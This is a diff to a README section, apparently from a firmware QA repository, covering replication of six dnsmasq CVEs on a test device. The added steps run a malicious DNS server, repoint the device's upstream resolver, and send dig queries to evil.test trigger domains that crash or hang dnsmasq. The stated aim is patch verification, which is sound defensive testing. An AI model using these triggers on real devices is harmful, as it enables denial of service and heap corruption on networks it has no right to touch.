@@ -712,43 +712,87 @@ python3 dnsmasq_cve_2026/dnsmasq_cve_tester.py --binary /usr/sbin/dnsmasq
 
 #### Replicate Against a Live Device (QA Test Procedure)
 
+**Why a malicious DNS server is needed:** dnsmasq only processes DNS responses from its configured upstream server. Sending crafted packets directly to dnsmasq's port 53 won't reach the vulnerable code path. To trigger crashes, we run a malicious DNS server on the test host and configure the DUT to use it as upstream.
+
 **Prerequisites:**
-- DUT (Device Under Test) running unpatched firmware on 192.168.1.1 (adjust IP as needed)
-- Test host on the same LAN with Python 3.6+
-- SSH/serial access to DUT for crash monitoring
+- DUT (Device Under Test) running unpatched firmware on 192.168.1.1
+- Test host on the same LAN (e.g., 192.168.1.100) with Python 3.6+
+- Serial/SSH access to DUT for crash monitoring and configuration
 
-**Step 1:** On the DUT, open a serial/SSH session and monitor for crashes:
+---
+
+**Step 1 — Start the malicious DNS server on your test host:**
+
 ```bash
-logread -f &
-while true; do pidof dnsmasq > /dev/null || echo "*** DNSMASQ CRASHED at $(date) ***"; sleep 1; done
+cd dnsmasq_cve_2026/
+
+# With root (uses standard DNS port 53):
+sudo python3 malicious_dns_server.py
+
+# Without root (uses port 5353):
+python3 malicious_dns_server.py --port 5353
 ```
 
-**Step 2:** From the test host, run all 6 CVE tests:
-```bash
-# Test ALL 6 CVEs at once
-python3 dnsmasq_cve_2026/dnsmasq_cve_tester.py --target 192.168.1.1
+**Step 2 — On the DUT (serial/SSH), configure dnsmasq to use your test host as upstream:**
 
-# Or test each CVE individually:
-python3 dnsmasq_cve_2026/dnsmasq_cve_tester.py --target 192.168.1.1 --test CVE-2026-2291
-python3 dnsmasq_cve_2026/dnsmasq_cve_tester.py --target 192.168.1.1 --test CVE-2026-5172
-python3 dnsmasq_cve_2026/dnsmasq_cve_tester.py --target 192.168.1.1 --test CVE-2026-4890
-python3 dnsmasq_cve_2026/dnsmasq_cve_tester.py --target 192.168.1.1 --test CVE-2026-4891
-python3 dnsmasq_cve_2026/dnsmasq_cve_tester.py --target 192.168.1.1 --test CVE-2026-4892
-python3 dnsmasq_cve_2026/dnsmasq_cve_tester.py --target 192.168.1.1 --test CVE-2026-4893
+```bash
+# If using port 53:
+echo "server=192.168.1.100" >> /etc/dnsmasq.conf
+
+# If using port 5353:
+echo "server=192.168.1.100#5353" >> /etc/dnsmasq.conf
+
+# Restart dnsmasq to pick up the new upstream
+killall -HUP dnsmasq
 ```
 
-**Step 3:** Observe results on DUT serial/SSH:
+**Step 3 — On the DUT, monitor for crash:**
 
-| CVE | What to look for on DUT | Vulnerable if... |
-|-----|------------------------|-----------------|
-| CVE-2026-2291 | `pidof dnsmasq` returns empty | dnsmasq process crashes (segfault) |
-| CVE-2026-5172 | `pidof dnsmasq` returns empty | dnsmasq process crashes (segfault) |
-| CVE-2026-4890 | `top` shows dnsmasq at 100% CPU, DNS queries get no response | dnsmasq hangs in infinite loop (not a crash) |
-| CVE-2026-4891 | `dmesg` shows segfault or dnsmasq stops responding | dnsmasq crashes or leaks memory |
-| CVE-2026-4892 | `dmesg \| grep segfault` shows helper crash | dnsmasq helper process crashes (runs as root) |
-| CVE-2026-4893 | Tool reports ECS option echoed without validation | Cache accepts spoofed subnet (no crash) |
+```bash
+tail -f /var/log/messages* &
+while true; do pidof dnsmasq > /dev/null || echo "*** DNSMASQ CRASHED at $(date) ***"; sleep 1; done &
+```
 
-**Step 4:** After applying patches, reflash and repeat. All tests should show the device surviving.
+**Step 4 — From your test host, trigger each CVE:**
+
+```bash
+# CVE-2026-5172 (HIGH) — crash via falsified rdlen (works on all builds)
+dig @192.168.1.1 crash-5172.evil.test
+
+# CVE-2026-2291 (CRITICAL) — heap overflow via escaped name (DNSSEC builds only)
+dig @192.168.1.1 crash-2291.evil.test
+
+# CVE-2026-4890 (HIGH) — infinite loop via NSEC bitmap (DNSSEC builds only)
+dig @192.168.1.1 crash-4890.evil.test
+```
+
+**Step 5 — Observe results on DUT console:**
+
+| CVE | Trigger domain | What happens on DUT | Vulnerable if... |
+|-----|---------------|--------------------|-----------------| 
+| CVE-2026-5172 | `crash-5172.evil.test` | dnsmasq segfaults | `pidof dnsmasq` returns empty |
+| CVE-2026-2291 | `crash-2291.evil.test` | dnsmasq segfaults | `pidof dnsmasq` returns empty (DNSSEC only) |
+| CVE-2026-4890 | `crash-4890.evil.test` | dnsmasq hangs, 100% CPU | DNS stops responding, process alive but frozen |
+| CVE-2026-4893 | (use direct tester) | No crash — functional bug | `dnsmasq_cve_tester.py --target` reports VULNERABLE |
+
+**Step 6 — After applying patches, reflash the DUT and repeat Steps 2-5.**
+
+All triggers should now result in dnsmasq remaining alive and responsive.
+
+---
+
+**CVE-2026-4892 (DHCPv6 CLID overflow)** — requires separate test:
+```bash
+# From a host on the same IPv6 LAN segment (needs root):
+sudo python3 dnsmasq_cve_tester.py --target 192.168.1.1 --test CVE-2026-4892
+# Monitor DUT: dmesg | grep segfault (helper process crash)
+```
+
+**CVE-2026-4893 (ECS bypass)** — no crash, use the direct tester:
+```bash
+python3 dnsmasq_cve_tester.py --target 192.168.1.1 --test CVE-2026-4893
+# Reports VULNERABLE if --add-subnet is active and source validation is bypassed
+```
 
 #### Platform Applicability
 
